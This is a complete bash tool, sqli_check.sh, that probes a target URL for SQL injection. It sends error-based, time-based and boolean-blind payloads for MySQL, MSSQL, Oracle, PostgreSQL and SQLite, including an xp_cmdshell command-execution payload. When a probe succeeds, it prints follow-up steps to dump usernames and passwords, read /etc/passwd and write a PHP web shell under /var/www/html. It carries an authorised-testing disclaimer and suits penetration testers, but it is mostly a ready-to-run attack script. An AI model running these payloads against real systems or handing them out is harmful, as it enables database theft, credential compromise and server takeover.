#!/usr/bin/env bash
# sqli_check.sh -- SQL injection enumeration for authorized penetration testing
#
# !! FOR AUTHORIZED PENETRATION TESTING AND CTF USE ONLY !!
# Do not use against systems you do not own or have explicit written permission to test.
#
# USAGE:
#   ./sqli_check.sh -u "http://target/page.php?id=1"
#   ./sqli_check.sh -u "http://target/login.php" -f "username=admin&password=test" -m POST
#   ./sqli_check.sh -u "http://target/page.php?id=1" -c "PHPSESSID=abc123"

set -euo pipefail

RED='\033[0;31m'; YELLOW='\033[1;33m'; GREEN='\033[0;32m'
CYAN='\033[0;36m'; BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'

die()    { echo -e "${RED}[!] $*${RESET}" >&2; exit 1; }
info()   { echo -e "${CYAN}[*] $*${RESET}"; }
good()   { echo -e "${GREEN}[+] $*${RESET}"; }
vuln()   { echo -e "${RED}${BOLD}[VULN] $*${RESET}"; }
warn()   { echo -e "${YELLOW}[-] $*${RESET}"; }
detail() { echo -e "${DIM}    $*${RESET}"; }
sep()    { echo -e "${BOLD}$(printf -- '-%.0s' {1..65})${RESET}"; }
header() { sep; echo -e "${BOLD}${CYAN}  $*${RESET}"; sep; }

usage() {
    echo -e "${BOLD}sqli_check.sh${RESET} -- SQL injection enumeration"
    echo -e ""
    echo -e "  ${CYAN}-u <url>${RESET}     Target URL (required). Include parameter to test."
    echo -e "               e.g. \"http://target/page.php?id=1\""
    echo -e "  ${CYAN}-m <method>${RESET}  HTTP method: GET | POST  (default: GET)"
    echo -e "  ${CYAN}-f <data>${RESET}    POST body e.g. \"user=admin&pass=test\""
    echo -e "  ${CYAN}-p <param>${RESET}   Specific parameter to fuzz (default: all found)"
    echo -e "  ${CYAN}-c <cookie>${RESET}  Cookie string e.g. \"PHPSESSID=abc123\""
    echo -e "  ${CYAN}-H <header>${RESET}  Extra HTTP header"
    echo -e "  ${CYAN}-d <dbtype>${RESET}  DB hint: mysql|mssql|oracle|postgres|sqlite|all (default: all)"
    echo -e "  ${CYAN}-o <file>${RESET}    Save results to file"
    echo -e "  ${CYAN}-v${RESET}           Verbose: show all tested payloads"
    echo -e "  ${CYAN}-h${RESET}           This help"
    echo -e ""
    echo -e "${BOLD}Examples:${RESET}"
    echo -e "  $0 -u \"http://10.10.10.5/item.php?id=1\""
    echo -e "  $0 -u \"http://10.10.10.5/login.php\" -m POST -f \"user=admin&pass=test\""
    echo -e "  $0 -u \"http://10.10.10.5/item.php?id=1\" -d mysql"
    echo -e "  $0 -u \"http://10.10.10.5/item.php?id=1\" -c \"session=xyz\" -o results.txt"
    exit 0
}

SLEEP_SECS=5

# --------------------------------------------------------------------------
# Payload libraries
# --------------------------------------------------------------------------

error_payloads_generic() {
    printf '%s\n' \
        "'" \
        "''" \
        "\"'" \
        "') or ('1'='1" \
        "1'" \
        "1 AND 1=1" \
        "1 AND 1=2" \
        "1 OR 1=1" \
        "1 OR 1=2" \
        "1' AND '1'='1" \
        "1' AND '1'='2" \
        "1' OR '1'='1" \
        "1\\" \
        ";" \
        "';" \
        "' --" \
        "' -- -" \
        "'/*" \
        "') --"
}

error_payloads_mysql() {
    printf '%s\n' \
        "' AND extractvalue(1,concat(0x7e,version()))-- -" \
        "' AND updatexml(1,concat(0x7e,version()),1)-- -" \
        "1 UNION SELECT NULL-- -" \
        "1 UNION SELECT NULL,NULL-- -" \
        "1 UNION SELECT NULL,NULL,NULL-- -" \
        "' UNION SELECT 1,version(),3-- -" \
        "' UNION SELECT 1,database(),3-- -" \
        "' UNION SELECT 1,user(),3-- -"
}

error_payloads_mssql() {
    printf '%s\n' \
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -" \
        "'; EXEC xp_cmdshell('whoami')-- -" \
        "' UNION SELECT NULL,@@version,NULL-- -" \
        "' UNION SELECT NULL,db_name(),NULL-- -" \
        "' UNION SELECT NULL,system_user,NULL-- -" \
        "1 AND 1=CONVERT(int,@@version)-- -"
}

error_payloads_oracle() {
    printf '%s\n' \
        "' AND 1=1 FROM dual-- -" \
        "' UNION SELECT NULL FROM dual-- -" \
        "' UNION SELECT NULL,NULL FROM dual-- -" \
        "' UNION SELECT banner,NULL FROM v\$version WHERE ROWNUM=1-- -"
}

error_payloads_postgres() {
    printf '%s\n' \
        "' AND 1=CAST(version() AS int)-- -" \
        "' UNION SELECT NULL,version(),NULL-- -" \
        "' UNION SELECT NULL,current_database(),NULL-- -" \
        "' UNION SELECT NULL,current_user,NULL-- -"
}

error_payloads_sqlite() {
    printf '%s\n' \
        "' UNION SELECT NULL-- -" \
        "' UNION SELECT NULL,NULL-- -" \
        "' UNION SELECT sqlite_version(),NULL-- -" \
        "1 AND 1=1" \
        "1 AND 1=2"
}

time_payloads_mysql() {
    printf '%s\n' \
        "' AND SLEEP(${SLEEP_SECS})-- -" \
        "1 AND SLEEP(${SLEEP_SECS})-- -" \
        "1' AND SLEEP(${SLEEP_SECS}) AND '1'='1" \
        "') AND SLEEP(${SLEEP_SECS})-- -" \
        "1 AND (SELECT * FROM (SELECT(SLEEP(${SLEEP_SECS})))a)-- -"
}

time_payloads_mssql() {
    printf '%s\n' \
        "'; WAITFOR DELAY '0:0:${SLEEP_SECS}'-- -" \
        "1; WAITFOR DELAY '0:0:${SLEEP_SECS}'-- -" \
        "' WAITFOR DELAY '0:0:${SLEEP_SECS}'-- -"
}

time_payloads_postgres() {
    printf '%s\n' \
        "'; SELECT pg_sleep(${SLEEP_SECS})-- -" \
        "1; SELECT pg_sleep(${SLEEP_SECS})-- -" \
        "' AND 1=(SELECT 1 FROM pg_sleep(${SLEEP_SECS}))-- -"
}

time_payloads_oracle() {
    printf '%s\n' \
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',${SLEEP_SECS})-- -" \
        "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',${SLEEP_SECS})-- -"
}

bool_payloads_true() {
    printf '%s\n' \
        "1 AND 1=1" \
        "1' AND '1'='1" \
        "1 AND 1=1-- -" \
        "1' AND 1=1-- -" \
        "1) AND (1=1" \
        "1') AND ('1'='1"
}

bool_payloads_false() {
    printf '%s\n' \
        "1 AND 1=2" \
        "1' AND '1'='2" \
        "1 AND 1=2-- -" \
        "1' AND 1=2-- -" \
        "1) AND (1=2" \
        "1') AND ('1'='2"
}

# --------------------------------------------------------------------------
# DB error detection
# --------------------------------------------------------------------------

detect_db_error() {
    local body="$1"

    if echo "$body" | grep -qiE \
        'you have an error in your sql syntax|mysql_fetch|supplied argument is not a valid mysql|mysqli_|sql syntax.*mariadb|Warning.*mysql_'; then
        echo "MySQL/MariaDB"; return 0
    fi
    if echo "$body" | grep -qiE \
        'unclosed quotation mark|incorrect syntax near|microsoft sql server|odbc sql server|Msg [0-9]+, Level [0-9]+'; then
        echo "MSSQL"; return 0
    fi
    if echo "$body" | grep -qiE \
        'ORA-[0-9]{4,}|oracle.*driver|quoted string not properly terminated|PLS-[0-9]{5}'; then
        echo "Oracle"; return 0
    fi
    if echo "$body" | grep -qiE \
        'pg_query\|pg_exec|postgresql.*error|unterminated quoted string at|ERROR:.*syntax error'; then
        echo "PostgreSQL"; return 0
    fi
    if echo "$body" | grep -qiE \
        'sqlite_|sqlite3_|SQLite.*error|unrecognized token'; then
        echo "SQLite"; return 0
    fi
    if echo "$body" | grep -qiE \
        'sql syntax|syntax error|invalid query|database error|DB Error|ODBC.*error'; then
        echo "Unknown (generic SQL error)"; return 0
    fi

    return 1
}

# --------------------------------------------------------------------------
# HTTP helpers
# --------------------------------------------------------------------------

send_request() {
    local url="$1" method="$2" data="$3" cookie="$4" extra_header="$5"
    local timeout=$(( SLEEP_SECS + 10 ))
    local args=(-s -L --max-time "$timeout" --max-redirs 2 -A "Mozilla/5.0"
                -w "\n__STATUS__%{http_code}__TIME__%{time_total}__")

    [[ -n "$cookie" ]]       && args+=(-b "$cookie")
    [[ -n "$extra_header" ]] && args+=(-H "$extra_header")
    [[ "$method" == "POST" ]] && args+=(-X POST -d "$data")

    curl "${args[@]}" "$url" 2>/dev/null || true
}

parse_response() {
    local raw="$1"
    RESP_BODY=$(echo "$raw" | sed 's/__STATUS__.*//g')
    RESP_STATUS=$(echo "$raw" | grep -oP '__STATUS__\K[0-9]+' || echo "0")
    RESP_TIME=$(echo "$raw" | grep -oP '__TIME__\K[0-9.]+' || echo "0")
}

url_encode() {
    python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1" 2>/dev/null || echo "$1"
}

inject_param() {
    local original="$1" param="$2" payload="$3"
    local encoded
    encoded=$(url_encode "$payload")
    echo "$original" | sed "s|\(${param}=\)[^&]*|\1${encoded}|"
}

extract_params() {
    local input="$1"
    echo "$input" | grep -oP '(?<=[?&])[^=&]+(?==)' 2>/dev/null || \
    echo "$input" | tr '&' '\n' | grep -oP '^[^=]+' 2>/dev/null || true
}

# --------------------------------------------------------------------------
# Main
# --------------------------------------------------------------------------

main() {
    local url="" method="GET" post_data="" target_param=""
    local cookie="" extra_header="" outfile="" verbose=0
    local dbtype="all"

    [[ $# -eq 0 ]] && usage

    while getopts "u:m:f:p:c:H:d:o:vh" opt; do
        case "$opt" in
            u) url="$OPTARG" ;;
            m) method="${OPTARG^^}" ;;
            f) post_data="$OPTARG" ;;
            p) target_param="$OPTARG" ;;
            c) cookie="$OPTARG" ;;
            H) extra_header="$OPTARG" ;;
            d) dbtype="$OPTARG" ;;
            o) outfile="$OPTARG" ;;
            v) verbose=1 ;;
            h) usage ;;
            *) usage ;;
        esac
    done

    command -v curl    &>/dev/null || die "curl is required"
    command -v python3 &>/dev/null || die "python3 is required"
    command -v bc      &>/dev/null || die "bc is required"
    [[ -z "$url" ]] && die "Target URL required (-u). Always quote it: -u \"http://...\""
    [[ "$method" =~ ^(GET|POST)$ ]] || die "Method must be GET or POST"

    # Determine which parameters to test
    local params=()
    if [[ -n "$target_param" ]]; then
        params=("$target_param")
    elif [[ "$method" == "POST" && -n "$post_data" ]]; then
        mapfile -t params < <(extract_params "$post_data")
    else
        local query_string="${url#*\?}"
        if [[ "$query_string" != "$url" ]]; then
            mapfile -t params < <(extract_params "$query_string")
        fi
    fi

    if [[ ${#params[@]} -eq 0 ]]; then
        warn "No parameters found to test."
        warn "GET:  include a parameter in the URL e.g. ?id=1"
        warn "POST: supply the body with -f \"param=value\""
        exit 1
    fi

    [[ -n "$outfile" ]] && {
        echo "sqli_check results -- $(date)" > "$outfile"
        echo "Target: $url"   >> "$outfile"
        echo "Method: $method" >> "$outfile"
        echo "---"            >> "$outfile"
    }

    sep
    echo -e "${BOLD}  SQL INJECTION CHECKER${RESET}"
    sep
    info "Target  : $url"
    info "Method  : $method"
    info "Params  : ${params[*]}"
    info "DB type : $dbtype"
    info "Sleep   : ${SLEEP_SECS}s (time-based tests)"
    echo ""

    # Baseline
    info "Getting baseline response..."
    local raw_bl
    raw_bl=$(send_request "$url" "$method" "$post_data" "$cookie" "$extra_header")
    parse_response "$raw_bl"
    local baseline_body="$RESP_BODY" baseline_status="$RESP_STATUS" baseline_len=${#RESP_BODY}
    info "Baseline: HTTP $baseline_status / $baseline_len bytes"
    echo ""

    local total_vulns=0

    for param in "${params[@]}"; do
        header "Testing parameter: $param"
        local param_vulns=0

        # ---- Stage 1: Error-based -----------------------------------------
        info "[Stage 1] Error-based detection..."

        local epayloads=()
        mapfile -t epayloads < <(error_payloads_generic)
        [[ "$dbtype" == "all" || "$dbtype" == "mysql"    ]] && mapfile -O ${#epayloads[@]} -t epayloads < <(error_payloads_mysql)
        [[ "$dbtype" == "all" || "$dbtype" == "mssql"    ]] && mapfile -O ${#epayloads[@]} -t epayloads < <(error_payloads_mssql)
        [[ "$dbtype" == "all" || "$dbtype" == "oracle"   ]] && mapfile -O ${#epayloads[@]} -t epayloads < <(error_payloads_oracle)
        [[ "$dbtype" == "all" || "$dbtype" == "postgres" ]] && mapfile -O ${#epayloads[@]} -t epayloads < <(error_payloads_postgres)
        [[ "$dbtype" == "all" || "$dbtype" == "sqlite"   ]] && mapfile -O ${#epayloads[@]} -t epayloads < <(error_payloads_sqlite)

        for payload in "${epayloads[@]}"; do
            local turl="$url" tdata="$post_data"
            [[ "$method" == "POST" ]] && tdata=$(inject_param "$post_data" "$param" "$payload") \
                                      || turl=$(inject_param "$url" "$param" "$payload")

            local raw; raw=$(send_request "$turl" "$method" "$tdata" "$cookie" "$extra_header")
            parse_response "$raw"

            local db_found=""
            if db_found=$(detect_db_error "$RESP_BODY"); then
                vuln "[ERROR-BASED SQLi] param=$param"
                detail "DB Type : $db_found"
                detail "Payload : $payload"
                detail "URL     : $turl"
                detail "Status  : HTTP $RESP_STATUS (${RESP_TIME}s)"
                echo ""
                [[ -n "$outfile" ]] && echo "[ERROR-BASED] $param | $db_found | $payload" >> "$outfile"
                ((param_vulns++)); ((total_vulns++))
                break
            fi
            [[ "$verbose" -eq 1 ]] && detail "No error: $payload"
        done

        # ---- Stage 2: Time-based blind ------------------------------------
        info "[Stage 2] Time-based blind detection (${SLEEP_SECS}s sleep per payload)..."

        local tpayloads=()
        [[ "$dbtype" == "all" || "$dbtype" == "mysql"    ]] && mapfile -O ${#tpayloads[@]} -t tpayloads < <(time_payloads_mysql)
        [[ "$dbtype" == "all" || "$dbtype" == "mssql"    ]] && mapfile -O ${#tpayloads[@]} -t tpayloads < <(time_payloads_mssql)
        [[ "$dbtype" == "all" || "$dbtype" == "postgres" ]] && mapfile -O ${#tpayloads[@]} -t tpayloads < <(time_payloads_postgres)
        [[ "$dbtype" == "all" || "$dbtype" == "oracle"   ]] && mapfile -O ${#tpayloads[@]} -t tpayloads < <(time_payloads_oracle)

        local threshold; threshold=$(echo "$SLEEP_SECS - 1" | bc)

        for payload in "${tpayloads[@]}"; do
            local turl="$url" tdata="$post_data"
            [[ "$method" == "POST" ]] && tdata=$(inject_param "$post_data" "$param" "$payload") \
                                      || turl=$(inject_param "$url" "$param" "$payload")

            local raw; raw=$(send_request "$turl" "$method" "$tdata" "$cookie" "$extra_header")
            parse_response "$raw"

            local delayed
            delayed=$(echo "$RESP_TIME >= $threshold" | bc -l 2>/dev/null || echo 0)

            if [[ "$delayed" == "1" ]]; then
                vuln "[TIME-BASED BLIND SQLi] param=$param"
                detail "Payload  : $payload"
                detail "URL      : $turl"
                detail "Response : ${RESP_TIME}s -- ${SLEEP_SECS}s delay confirmed"
                echo ""
                [[ -n "$outfile" ]] && echo "[TIME-BASED] $param | $payload | ${RESP_TIME}s" >> "$outfile"
                ((param_vulns++)); ((total_vulns++))
                break
            fi
            [[ "$verbose" -eq 1 ]] && detail "No delay (${RESP_TIME}s): $payload"
        done

        # ---- Stage 3: Boolean-based blind --------------------------------
        info "[Stage 3] Boolean-based blind detection..."

        local bptrue=() bpfalse=()
        mapfile -t bptrue  < <(bool_payloads_true)
        mapfile -t bpfalse < <(bool_payloads_false)

        for i in "${!bptrue[@]}"; do
            local tp="${bptrue[$i]}" fp="${bpfalse[$i]}"
            local turl_t="$url" tdata_t="$post_data"
            local turl_f="$url" tdata_f="$post_data"

            if [[ "$method" == "POST" ]]; then
                tdata_t=$(inject_param "$post_data" "$param" "$tp")
                tdata_f=$(inject_param "$post_data" "$param" "$fp")
            else
                turl_t=$(inject_param "$url" "$param" "$tp")
                turl_f=$(inject_param "$url" "$param" "$fp")
            fi

            local raw_t raw_f
            raw_t=$(send_request "$turl_t" "$method" "$tdata_t" "$cookie" "$extra_header")
            raw_f=$(send_request "$turl_f" "$method" "$tdata_f" "$cookie" "$extra_header")

            parse_response "$raw_t"; local tbody="$RESP_BODY" tstat="$RESP_STATUS"; local tlen=${#tbody}
            parse_response "$raw_f"; local fbody="$RESP_BODY" fstat="$RESP_STATUS"; local flen=${#fbody}

            local diff=$(( tlen - flen ))
            local abs=${diff#-}

            if [[ "$tstat" != "$fstat" || "$abs" -gt 50 ]]; then
                vuln "[BOOLEAN-BASED BLIND SQLi] param=$param"
                detail "TRUE  : $tp  --> HTTP $tstat / ${tlen}b"
                detail "FALSE : $fp  --> HTTP $fstat / ${flen}b"
                detail "Delta : ${abs} bytes | status $tstat vs $fstat"
                echo ""
                [[ -n "$outfile" ]] && echo "[BOOLEAN-BASED] $param | TRUE:$tp | FALSE:$fp | delta:${abs}b" >> "$outfile"
                ((param_vulns++)); ((total_vulns++))
                break
            fi
            [[ "$verbose" -eq 1 ]] && detail "No diff: TRUE=${tlen}b FALSE=${flen}b"
        done

        [[ "$param_vulns" -eq 0 ]] && good "No SQLi detected in: $param"
        echo ""
    done

    # ---- Summary ---------------------------------------------------------
    sep
    if [[ "$total_vulns" -gt 0 ]]; then
        vuln "$total_vulns SQLi finding(s) confirmed across ${#params[@]} parameter(s)."
        echo ""
        echo -e "${YELLOW}  Manual next steps:${RESET}"
        echo -e "${YELLOW}  1. Identify DB type from error messages above${RESET}"
        echo -e "${YELLOW}  2. Enumerate databases via UNION or error-based injection${RESET}"
        echo -e "${YELLOW}  3. Extract table names from information_schema.tables${RESET}"
        echo -e "${YELLOW}  4. Dump credentials from users/accounts tables${RESET}"
        echo -e "${YELLOW}  5. Check for file read: UNION SELECT LOAD_FILE('/etc/passwd')${RESET}"
        echo -e "${YELLOW}  6. Check for file write: INTO OUTFILE '/var/www/html/shell.php'${RESET}"
        echo ""
        echo -e "${CYAN}  Useful manual queries (MySQL):${RESET}"
        echo -e "${CYAN}    Version  : ' UNION SELECT 1,version(),3-- -${RESET}"
        echo -e "${CYAN}    Database : ' UNION SELECT 1,database(),3-- -${RESET}"
        echo -e "${CYAN}    Tables   : ' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -${RESET}"
        echo -e "${CYAN}    Columns  : ' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -${RESET}"
        echo -e "${CYAN}    Dump     : ' UNION SELECT 1,concat(username,0x3a,password),3 FROM users-- -${RESET}"
        echo ""
    else
        good "No SQLi detected across ${#params[@]} parameter(s)."
        warn "Automated tools miss many injections -- always follow up manually."
        warn "Try adding quotes manually: id=1' id=1\" id=1') id=1\\"
    fi

    [[ -n "$outfile" ]] && good "Results saved to: $outfile"
}

main "$@"
